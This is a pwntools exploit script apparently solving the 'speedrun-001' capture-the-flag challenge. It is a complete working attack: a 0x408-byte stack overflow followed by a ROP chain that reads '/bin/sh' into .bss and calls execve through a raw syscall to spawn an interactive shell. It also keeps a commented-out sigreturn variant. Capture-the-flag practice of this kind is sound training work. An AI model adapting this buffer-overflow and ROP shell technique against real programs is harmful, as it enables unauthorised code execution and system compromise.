from pwn import *

elf = ELF('./speedrun-001')

context(arch='amd64')

pop_rax_addr = 0x0000000000415664
pop_rdi_addr = 0x0000000000400686
pop_rsi_addr = 0x00000000004101f3
pop_rdx_addr = 0x00000000004498b5
syscall_addr = 0x0000000000474e65

read_addr = 0x0000000004498A0

padding = b'B' * 0x408

command_ptr = elf.bss(0x100)

rop  = ROP('./speedrun-001')

# read(stdin, ptr, size)
rop.call(read_addr, [constants.STDIN_FILENO, command_ptr, 0x10])

# Sigreturn attack
# rop.execve(command_ptr, 0, 0)

# Syscall attack
# execve(ptr, 0, 0)
rop.raw(pop_rax_addr)
rop.raw(59)
rop.call(syscall_addr, [command_ptr, 0, 0])

payload = padding + rop.chain()

p = process('./speedrun-001')

p.sendafter(b'?\n', payload)
p.sendafter(b'\n', b'/bin/sh')

p.interactive()
